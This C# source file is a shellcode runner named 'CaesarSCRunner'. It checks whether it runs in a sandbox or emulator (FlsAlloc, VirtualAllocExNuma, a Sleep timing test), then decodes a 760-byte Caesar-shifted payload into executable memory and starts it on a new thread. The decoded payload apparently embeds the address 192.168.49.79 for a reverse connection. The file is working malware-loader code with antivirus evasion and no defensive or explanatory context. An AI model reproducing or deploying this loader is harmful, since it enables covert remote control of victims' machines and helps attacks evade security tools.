using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CaesarSCRunner
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nnPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);

            if (ptrCheck == null)
            {
                Console.WriteLine("If hit");
                Console.WriteLine(ptrCheck);

                return;

            }

            Console.WriteLine("If not hit");
            Console.WriteLine(ptrCheck);

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            if (addr == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalMilliseconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[760] { 0x02, 0x4e, 0x89, 0xea, 0xf6, 0xee, 0xd2, 0x06, 0x06, 0x06, 0x47, 0x57, 0x47, 0x56, 0x58, 0x57, 0x4e, 0x37, 0xd8, 0x5c, 0x6b, 0x4e, 0x91, 0x58, 0x66, 0x4e, 0x91, 0x58, 0x1e, 0x4e, 0x91, 0x58, 0x26, 0x4e, 0x15, 0xbd, 0x50, 0x50, 0x4e, 0x91, 0x78, 0x56, 0x53, 0x37, 0xcf, 0x4e, 0x37, 0xc6, 0xb2, 0x42, 0x67, 0x82, 0x08, 0x32, 0x26, 0x47, 0xc7, 0xcf, 0x13, 0x47, 0x07, 0xc7, 0xe8, 0xf3, 0x58, 0x47, 0x57, 0x4e, 0x91, 0x58, 0x26, 0x91, 0x48, 0x42, 0x4e, 0x07, 0xd6, 0x6c, 0x87, 0x7e, 0x1e, 0x11, 0x08, 0x15, 0x8b, 0x78, 0x06, 0x06, 0x06, 0x91, 0x86, 0x8e, 0x06, 0x06, 0x06, 0x4e, 0x8b, 0xc6, 0x7a, 0x6d, 0x4e, 0x07, 0xd6, 0x56, 0x4a, 0x91, 0x46, 0x26, 0x4f, 0x07, 0xd6, 0x91, 0x4e, 0x1e, 0xe9, 0x5c, 0x53, 0x37, 0xcf, 0x4e, 0x05, 0xcf, 0x47, 0x91, 0x3a, 0x8e, 0x4e, 0x07, 0xdc, 0x4e, 0x37, 0xc6, 0x47, 0xc7, 0xcf, 0x13, 0xb2, 0x47, 0x07, 0xc7, 0x3e, 0xe6, 0x7b, 0xf7, 0x52, 0x09, 0x52, 0x2a, 0x0e, 0x4b, 0x3f, 0xd7, 0x7b, 0xde, 0x5e, 0x4a, 0x91, 0x46, 0x2a, 0x4f, 0x07, 0xd6, 0x6c, 0x47, 0x91, 0x12, 0x4e, 0x4a, 0x91, 0x46, 0x22, 0x4f, 0x07, 0xd6, 0x47, 0x91, 0x0a, 0x8e, 0x4e, 0x07, 0xd6, 0x47, 0x5e, 0x47, 0x5e, 0x64, 0x5f, 0x60, 0x47, 0x5e, 0x47, 0x5f, 0x47, 0x60, 0x4e, 0x89, 0xf2, 0x26, 0x47, 0x58, 0x05, 0xe6, 0x5e, 0x47, 0x5f, 0x60, 0x4e, 0x91, 0x18, 0xef, 0x51, 0x05, 0x05, 0x05, 0x63, 0x4e, 0x37, 0xe1, 0x59, 0x4f, 0xc4, 0x7d, 0x6f, 0x74, 0x6f, 0x74, 0x6b, 0x7a, 0x06, 0x47, 0x5c, 0x4e, 0x8f, 0xe7, 0x4f, 0xcd, 0xc8, 0x52, 0x7d, 0x2c, 0x0d, 0x05, 0xdb, 0x59, 0x59, 0x4e, 0x8f, 0xe7, 0x59, 0x60, 0x53, 0x37, 0xc6, 0x53, 0x37, 0xcf, 0x59, 0x59, 0x4f, 0xc0, 0x40, 0x5c, 0x7f, 0xad, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0xee, 0x14, 0x06, 0x06, 0x06, 0x37, 0x3f, 0x38, 0x34, 0x37, 0x3c, 0x3e, 0x34, 0x3a, 0x3f, 0x34, 0x3d, 0x3f, 0x06, 0x60, 0x4e, 0x8f, 0xc7, 0x4f, 0xcd, 0xc6, 0xc1, 0x07, 0x06, 0x06, 0x53, 0x37, 0xcf, 0x59, 0x59, 0x70, 0x09, 0x59, 0x4f, 0xc0, 0x5d, 0x8f, 0xa5, 0xcc, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0xee, 0xd4, 0x06, 0x06, 0x06, 0x35, 0x77, 0x56, 0x59, 0x48, 0x80, 0x6c, 0x6c, 0x37, 0x38, 0x55, 0x7d, 0x7f, 0x55, 0x4a, 0x53, 0x3c, 0x5b, 0x78, 0x3d, 0x53, 0x68, 0x47, 0x70, 0x4f, 0x56, 0x7f, 0x73, 0x3e, 0x4c, 0x76, 0x4f, 0x4a, 0x78, 0x3b, 0x7f, 0x57, 0x4f, 0x5f, 0x36, 0x78, 0x3a, 0x78, 0x4f, 0x6a, 0x3c, 0x5d, 0x53, 0x39, 0x4c, 0x7a, 0x55, 0x6c, 0x6f, 0x77, 0x75, 0x77, 0x56, 0x6e, 0x51, 0x33, 0x5d, 0x69, 0x56, 0x3c, 0x6a, 0x67, 0x74, 0x7c, 0x52, 0x55, 0x6b, 0x5c, 0x52, 0x6d, 0x48, 0x5a, 0x7d, 0x59, 0x73, 0x4b, 0x79, 0x6a, 0x5a, 0x65, 0x39, 0x74, 0x68, 0x5e, 0x50, 0x6d, 0x49, 0x71, 0x67, 0x5b, 0x6e, 0x7f, 0x6a, 0x48, 0x3e, 0x5c, 0x3d, 0x70, 0x3a, 0x59, 0x50, 0x3c, 0x70, 0x56, 0x4c, 0x77, 0x36, 0x33, 0x65, 0x52, 0x5a, 0x7b, 0x57, 0x4e, 0x4e, 0x4b, 0x73, 0x3e, 0x49, 0x6e, 0x5d, 0x6b, 0x5f, 0x79, 0x7e, 0x7b, 0x4e, 0x51, 0x50, 0x4a, 0x5d, 0x3e, 0x7a, 0x6a, 0x4a, 0x4c, 0x6c, 0x6a, 0x5a, 0x6e, 0x65, 0x3b, 0x71, 0x3b, 0x78, 0x67, 0x79, 0x7d, 0x67, 0x6d, 0x3b, 0x47, 0x5b, 0x3e, 0x3c, 0x36, 0x3c, 0x67, 0x6c, 0x38, 0x79, 0x79, 0x78, 0x70, 0x78, 0x4d, 0x7d, 0x7f, 0x58, 0x4b, 0x3c, 0x7b, 0x7e, 0x77, 0x3d, 0x6a, 0x67, 0x57, 0x78, 0x6f, 0x36, 0x51, 0x56, 0x77, 0x78, 0x6f, 0x47, 0x6e, 0x3d, 0x55, 0x6d, 0x58, 0x59, 0x7a, 0x6d, 0x7d, 0x60, 0x5b, 0x3a, 0x38, 0x06, 0x4e, 0x8f, 0xc7, 0x59, 0x60, 0x47, 0x5e, 0x53, 0x37, 0xcf, 0x59, 0x4e, 0xbe, 0x06, 0x38, 0xae, 0x8a, 0x06, 0x06, 0x06, 0x06, 0x56, 0x59, 0x59, 0x4f, 0xcd, 0xc8, 0xf1, 0x5b, 0x34, 0x41, 0x05, 0xdb, 0x4e, 0x8f, 0xcc, 0x70, 0x10, 0x65, 0x4e, 0x8f, 0xf7, 0x70, 0x25, 0x60, 0x58, 0x6e, 0x86, 0x39, 0x06, 0x06, 0x4f, 0x8f, 0xe6, 0x70, 0x0a, 0x47, 0x5f, 0x4f, 0xc0, 0x7b, 0x4c, 0xa4, 0x8c, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0x53, 0x37, 0xc6, 0x59, 0x60, 0x4e, 0x8f, 0xf7, 0x53, 0x37, 0xcf, 0x53, 0x37, 0xcf, 0x59, 0x59, 0x4f, 0xcd, 0xc8, 0x33, 0x0c, 0x1e, 0x81, 0x05, 0xdb, 0x8b, 0xc6, 0x7b, 0x25, 0x4e, 0xcd, 0xc7, 0x8e, 0x19, 0x06, 0x06, 0x4f, 0xc0, 0x4a, 0xf6, 0x3b, 0xe6, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0x4e, 0x05, 0xd5, 0x7a, 0x08, 0xf1, 0xb0, 0xee, 0x5b, 0x06, 0x06, 0x06, 0x59, 0x5f, 0x70, 0x46, 0x60, 0x4f, 0x8f, 0xd7, 0xc7, 0xe8, 0x16, 0x4f, 0xcd, 0xc6, 0x06, 0x16, 0x06, 0x06, 0x4f, 0xc0, 0x5e, 0xaa, 0x59, 0xeb, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0x4e, 0x99, 0x59, 0x59, 0x4e, 0x8f, 0xed, 0x4e, 0x8f, 0xf7, 0x4e, 0x8f, 0xe0, 0x4f, 0xcd, 0xc6, 0x06, 0x26, 0x06, 0x06, 0x4f, 0x8f, 0xff, 0x4f, 0xc0, 0x18, 0x9c, 0x8f, 0xe8, 0x06, 0x06, 0x06, 0x06, 0x05, 0xdb, 0x4e, 0x89, 0xca, 0x26, 0x8b, 0xc6, 0x7a, 0xb8, 0x6c, 0x91, 0x0d, 0x4e, 0x07, 0xc9, 0x8b, 0xc6, 0x7b, 0xd8, 0x5e, 0xc9, 0x5e, 0x70, 0x06, 0x5f, 0xc1, 0xe6, 0x23, 0x30, 0x10, 0x47, 0x8f, 0xe0, 0x05, 0xdb };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 6) & 0xFF);
            }
            int size = buf.Length;

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
